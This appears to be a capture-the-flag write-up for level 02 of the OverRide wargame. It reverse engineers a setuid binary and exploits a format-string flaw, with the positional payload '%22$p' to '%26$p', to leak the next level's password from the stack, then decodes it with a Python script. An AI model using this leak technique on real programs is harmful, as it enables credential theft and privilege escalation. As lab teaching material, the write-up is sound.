# Level 02

## Base analysis

As usual, we start by figuring out who we are and what we're dealing with :

```
level02@OverRide:~$ id
uid=2002(level02) gid=2002(level02) groups=2002(level02),100(users)
level02@OverRide:~$ ls -l
total 12
-rwsr-s---+ 1 level03 users 7503 Sep 10  2016 level02
```

The binary is owned by `level03` and carries the setuid/setgid bits (`s`), so whatever shell or read it grants us will run with `level03`'s privileges. That's the privilege jump we're after.

Next, the protections :

```
level02@OverRide:~$ checksec --file ./level02
RELRO           STACK CANARY      NX            PIE       RPATH      RUNPATH      FILE
Partial RELRO   Canary found     NX enabled    No PIE    No RPATH   No RUNPATH   /home/users/level02/level02
```

Unlike Level01, NX is enabled and there's a stack canary, so the shellcode-on-the-stack approach is off the table here. We'll need a different angle. This level presents a "Secure Access System" that prompts for a username and a password, both read with `fgets()`. The decompiled `main()` reveals something interesting happening *before* the prompts even appear.

## Reverse engineering

### The password is loaded onto the stack for us

Right at the start of `main()`, the program opens the next level's password file and reads it into a stack buffer :

```c
local_10 = fopen("/home/users/level03/.pass","r");
...
sVar2 = fread(local_a8, 1, 0x29, local_10);   // reads 0x29 = 41 bytes into local_a8
local_14 = (int)sVar2;
...
if (local_14 != 0x29) { /* error */ }
```

So `local_a8` holds the **40-character password** of `level03` (plus the trailing byte), sitting on the stack. The program later compares our password input against it with `strncmp`, but it never prevents that buffer from being present on the stack the whole time. If we can find a way to read the stack, we can read the flag directly — we don't even need to know the password to pass the comparison.

### The format string vulnerability

At the very end of `main()`, in the "access denied" branch :

```c
printf(local_78);              // local_78 is OUR username, used as the format string!
puts(" does not have access!");
```

`local_78` is the username we typed, and it's passed **directly as the format string** to `printf` instead of the safe `printf("%s", local_78)`. This is a classic **format string vulnerability** : any conversion specifier we put in our username (`%x`, `%p`, `%s`, `%n`...) will be interpreted by `printf`, which then reads (or writes) values off the stack as if they were arguments we never supplied.

The `strncmp` against the real password is just a gate — we deliberately fail it so that execution falls into this `else` branch and triggers `printf(local_78)`.

## Working out the stack layout

We can read the stack frame size and variable offsets straight from Ghidra. The prologue tells us the total frame size :

```
00400815 MOV  RBP,RSP
00400818 SUB  RSP,0x120        ; 288-byte stack frame
```

And the variable listing gives each buffer's position relative to `RBP` :

| Variable   | Offset from RBP | Meaning                          |
|------------|-----------------|----------------------------------|
| `local_118`| `RBP - 0x110`   | password input buffer            |
| `local_a8` | `RBP - 0xa0`    | **the level03 password (fread)** |
| `local_78` | `RBP - 0x70`    | username buffer (our format str) |

The buffer we want to leak is `local_a8` at `RBP - 0xa0` (160 bytes below RBP), inside a 288-byte (`0x120`) frame. Since this is a **64-bit** binary, every step up the stack reads **8 bytes** at a time.

## Finding the parameter offset

On x86-64, `printf`'s first arguments come from registers, and only after those does it start reading from the stack. With positional specifiers (`%N$p`), the stack portion begins at `%6$` (which points at the top of the stack, `RSP`). We compute how far `local_a8` is from `RSP` :

```
RBP = RSP + 0x120          (after the prologue)
local_a8 = RBP - 0xa0 = RSP + 0x120 - 0xa0 = RSP + 0x80   (128 bytes above RSP)
```

So the parameter index for `local_a8` is :

```
6 + (0x80 / 8) = 6 + 16 = 22
```

`%22$p` lands on the first 8 bytes of the password. The flag is 40 characters long, so we need **5 consecutive 8-byte reads** : indices **22 through 26**.

## Leaking the password

We feed the positional specifiers as our username and fail the password check on purpose :

```bash
./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p
--[ Password: whatever
*****************************************
0xXXXXXXXXXXXXXXXX0xXXXXXXXXXXXXXXXX0xXXXXXXXXXXXXXXXX0xXXXXXXXXXXXXXXXX0xXXXXXXXXXXXXXXXX
 does not have access!
```

Each `0x...` block is 8 bytes of the password, printed as a little-endian hex value.

## Decoding the leak

Each leaked qword is a chunk of the ASCII password, but stored **little-endian**, so the bytes within each 8-byte block are reversed. To rebuild the string we :

- drop the `0x` prefixes,
- split into the 5 blocks,
- convert each block from hex to bytes,
- reverse the byte order of each block (undo little-endian),
- concatenate.

A short Python script does it :

```python
#!/usr/bin/env python3
leak = "0xXXXXXXXXXXXXXXXX0xXXXXXXXXXXXXXXXX0xXXXXXXXXXXXXXXXX0xXXXXXXXXXXXXXXXX0xXXXXXXXXXXXXXXXX"
out = b""
for block in leak.split("0x"):
    if block:
        out += bytes.fromhex(block)[::-1]   # hex -> bytes, then undo little-endian
print(out.decode())
```

Running it reassembles the full 40-character password for `level03`, which we can then use to `su level03`.

> Note : the parameter offset is `22` (`6 + 0x80/8`), and we must read indices `22` to `26` to capture all 40 bytes. Reusing the same index (e.g. `%25$p` twice) duplicates a block and corrupts the result, so make sure the five indices are distinct and consecutive.

Level 02, clear... Progress to next level ? (Y/n) : ___
